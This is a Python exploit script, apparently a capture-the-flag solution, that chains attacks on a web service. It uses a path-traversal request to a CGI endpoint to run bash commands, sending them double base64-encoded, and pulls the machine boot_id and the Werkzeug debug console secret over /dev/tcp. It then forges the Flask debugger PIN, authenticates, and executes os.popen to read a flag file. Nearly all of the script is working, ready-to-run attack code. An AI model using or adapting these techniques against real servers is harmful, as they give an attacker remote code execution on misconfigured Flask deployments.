from base64 import b64encode
from pincode import get_pin_code
from encoder import encode_cmd

import requests
import os
import re

def ip2uuid(ip_addr):
    sixtet = ''.join(map(lambda x: hex(int(x)).lstrip('-0x').zfill(2), ip_addr.split('.')))
    mac_addr = '0242' + sixtet

    return str(int(mac_addr, 16))

def send_payload(cmd):
    with open('payload', 'w') as fd:
        command = 'echo && echo {} | base64 -d | base64 -d | bash'.format(
            b64encode(b64encode(cmd.encode('utf-8'))).decode('utf-8')
        )

        fd.write(encode_cmd(command))

    return os.popen(
        "curl -s 'http://localhost:11071/.cgi-bin/.%2E/.%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/bin/bash' -d @payload"
    ).read()


machine_id = send_payload('cat /proc/sys/kernel/random/boot_id').strip()
backend_ip = send_payload("echo backend | perl -lpe 'use Socket; $_=inet_ntoa(inet_aton($_));'").strip()

response = send_payload('exec 3<>/dev/tcp/backend/5000 && echo -e "GET /console HTTP/1.1\r\nhost: http://backend:5000\r\nConnection: close\r\n\r\n" >&3 && cat <&3')
secret = re.findall('SECRET.*"(.*?)"', response)[0]

pincode = get_pin_code('nobody', 'flask.app', 'Flask', '/usr/local/lib/python3.10/site-packages/flask/app.py', ip2uuid(backend_ip), machine_id)

# curl 'http://backend:5000/console/?__debugger__=yes&cmd=pinauth&frm=0&s=vKOcJVw577gusdCb7e7B&pin=103-552-081'
response = send_payload('exec 3<>/dev/tcp/backend/5000 && echo -e "GET /console?__debugger__=yes&cmd=pinauth&frm=0&s=%s&pin=%s HTTP/1.1\r\nhost: http://backend:5000\r\nConnection: close\r\n\r\n" >&3 && cat <&3' % (secret, pincode))
cookies = re.findall('(_.*?);', response)[0]

# curl --cookie '__wzdeee7c62bec85865bb81a=1660150888|0597336bc876' 'http://backend:5000/console/?__debugger__=yes&cmd=__import__("os").popen("cat</flag.txt").read()&frm=0&s=vKOcJVw577gusdCb7e7B&pin=103-552-081'
response = send_payload('exec 3<>/dev/tcp/backend/5000 && echo -e "GET /console?__debugger__=yes&cmd=__import__(\\"os\\").popen(\\"cat</flag_0ac73b4846fea622e906199d592eaa85\\").read()&frm=0&s=%s&pin=%s HTTP/1.1\r\nhost: http://backend:5000\r\nCookie: %s\r\nConnection: close\r\n\r\n" >&3 && cat <&3' % (secret, pincode, cookies))
print(response)


